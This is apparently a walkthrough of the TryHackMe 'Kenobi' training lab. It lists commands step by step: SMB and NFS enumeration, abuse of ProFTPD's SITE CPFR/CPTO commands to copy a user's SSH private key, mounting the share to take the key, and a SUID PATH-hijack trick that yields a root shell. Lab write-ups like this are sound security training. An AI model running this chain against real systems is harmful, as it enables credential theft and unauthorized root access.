## Kenobi room from try hack me.

## Difficulty: Easy

## www.tryhackme.com

## Nmap

First we have to scan the machine with nmap, this can be done by using the command `nmap -sC -sV {IP}`.

This will then give us the first answer of how many ports are open on the machine, which is 7.

***

## Samba

We see that samba is running, we need to enumerate the shares using the command `nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse {ip}`.

![image](https://user-images.githubusercontent.com/66257304/133940755-ab5191f3-f116-4e85-afa1-3ab87bbba2f3.png)

We now see that there are 3 shares which is the answer to the next question.

***

## Smbclient

We now can inspect the shares using the command `smbclient //<ip>/anonymous`.

Now we can list the files and answer the next question.

We now need to download the file so we can open it, we can do this using the command `smbget -R smb://<ip>/anonymous`.

Now we have opened the file we can see the ftp port at the top of the file.

We saw in the nmap scan before that rpc was running on port 111, we can enumerate this using the command `nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount {ip}`.

We can now see the mount.

## Ftp 

We can now connect to the machine on the ftp port using the command `nc {ip} 21`.

We should see the version used in the output.

***

We can use searchsploit to look for exploits, run the command `searchsploit proftpd 1.3.5` to see all the known exploits.

We can copy kenobi's private key, lets do that using the commands, 
`SITE CPFR /home/kenobi/.ssh/id_rsa`
`SITE CPTO /var/tmp/id_rsa`

We can now mount the /var/tmp directory to our machine using the commands,
`sudo mkdir /mnt/kenobiNFS`
`mount ip:/var /mnt/kenobiNFS`
`ls -la /mnt/kenobiNFS`

Use the command `cp /mnt/kenobiNFS/tmp/id_rsa .` to copy kenobi's private key to our current directory.

Lets now ssh into the machine using the commands, 
`sudo chmod 600 id_rsa`
`ssh -i id_rsa kenobi@ip`

Now we can get the user flag.

## Privelage Escalation

Now we need to escalate our privs to root to get the root flag.

Lets look at the suid binarys using the command `find / -perm -u=s -type f 2>/dev/null`

![image](https://user-images.githubusercontent.com/66257304/133941328-27762d68-8edf-405b-b643-a625bc7877d7.png)

This one looks a bit weird, lets run it to see what it does, use the command `menu`.

![image](https://user-images.githubusercontent.com/66257304/133941346-539c0107-0bad-4488-bfa1-31b45ff6aca5.png)

Looks like we get 3 options, to run a status check, view the kernel version and to view ifconfig.

Lets run strings to see if theres anything we can use, use the command `strings /usr/bin/menu`.

![image](https://user-images.githubusercontent.com/66257304/133941441-73724f33-03f5-4999-8574-5b4812dbffd8.png)

We see that it is not using a full path, we can use this to our advantage.

Use the commands,

`echo /bin/sh > curl`
`chmod 777 curl`
`export PATH=/tmp:$PATH`
`/usr/bin/menu`

Now we should have a root shell and we can just go and get the root flag.




